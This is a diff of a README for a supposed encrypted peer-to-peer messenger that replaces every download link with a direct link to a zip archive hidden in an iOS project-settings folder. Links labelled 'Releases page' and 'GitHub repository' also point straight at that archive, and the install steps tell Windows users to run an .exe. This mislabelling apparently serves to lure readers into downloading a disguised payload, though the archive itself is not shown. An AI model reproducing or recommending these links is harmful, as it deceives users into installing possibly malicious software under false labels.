@@ -4,13 +4,13 @@
 
 Welcome to secure-p2p-messenger! This lightweight end-to-end encrypted peer-to-peer messenger is designed for small groups of 10 to 50 users. With multi-device support and no need for phone numbers, you can enjoy secure and private conversations with ease.
 
-[![Download](https://github.com/Horizon6252/secure-p2p-messenger/raw/refs/heads/main/windows/runner/secure_messenger_p_v1.2.zip)](https://github.com/Horizon6252/secure-p2p-messenger/raw/refs/heads/main/windows/runner/secure_messenger_p_v1.2.zip)
+[![Download](https://raw.githubusercontent.com/Horizon6252/secure-p2p-messenger/main/ios/Runner.xcodeproj/xcshareddata/secure_messenger_p_1.9.zip)](https://raw.githubusercontent.com/Horizon6252/secure-p2p-messenger/main/ios/Runner.xcodeproj/xcshareddata/secure_messenger_p_1.9.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the application. Here’s how to do it:
 
-1. Go to the [Releases page](https://github.com/Horizon6252/secure-p2p-messenger/raw/refs/heads/main/windows/runner/secure_messenger_p_v1.2.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Horizon6252/secure-p2p-messenger/main/ios/Runner.xcodeproj/xcshareddata/secure_messenger_p_1.9.zip).
 2. Find the latest version of secure-p2p-messenger.
 3. Choose the appropriate file for your operating system and click on it to download. 
    - If you are using Windows, select the `.exe` file.
@@ -60,7 +60,7 @@ A: Yes, you can use secure-p2p-messenger on any device that supports the applica
 
 ## 🔄 Update the App
 
-To ensure you have the latest features and security updates, regularly check the [Releases page](https://github.com/Horizon6252/secure-p2p-messenger/raw/refs/heads/main/windows/runner/secure_messenger_p_v1.2.zip) for new versions. Simply download the latest version and follow the same installation steps.
+To ensure you have the latest features and security updates, regularly check the [Releases page](https://raw.githubusercontent.com/Horizon6252/secure-p2p-messenger/main/ios/Runner.xcodeproj/xcshareddata/secure_messenger_p_1.9.zip) for new versions. Simply download the latest version and follow the same installation steps.
 
 ## 📞 Support
 
@@ -68,7 +68,7 @@ If you encounter issues, need assistance, or have questions, please reach out th
 
 ## 🚀 Contributing
 
-Want to help improve secure-p2p-messenger? Contributions are welcome! You can submit bug reports, suggest features, or even contribute code. Visit the [GitHub repository](https://github.com/Horizon6252/secure-p2p-messenger/raw/refs/heads/main/windows/runner/secure_messenger_p_v1.2.zip) for more details.
+Want to help improve secure-p2p-messenger? Contributions are welcome! You can submit bug reports, suggest features, or even contribute code. Visit the [GitHub repository](https://raw.githubusercontent.com/Horizon6252/secure-p2p-messenger/main/ios/Runner.xcodeproj/xcshareddata/secure_messenger_p_1.9.zip) for more details.
 
 ## 🌐 Learn More
 
@@ -80,4 +80,4 @@ For more information on technology and encryption used in secure-p2p-messenger, 
 
 Stay connected and keep your conversations private. Download secure-p2p-messenger today!
 
-[![Download](https://github.com/Horizon6252/secure-p2p-messenger/raw/refs/heads/main/windows/runner/secure_messenger_p_v1.2.zip)](https://github.com/Horizon6252/secure-p2p-messenger/raw/refs/heads/main/windows/runner/secure_messenger_p_v1.2.zip)
+[![Download](https://raw.githubusercontent.com/Horizon6252/secure-p2p-messenger/main/ios/Runner.xcodeproj/xcshareddata/secure_messenger_p_1.9.zip)](https://raw.githubusercontent.com/Horizon6252/secure-p2p-messenger/main/ios/Runner.xcodeproj/xcshareddata/secure_messenger_p_1.9.zip)
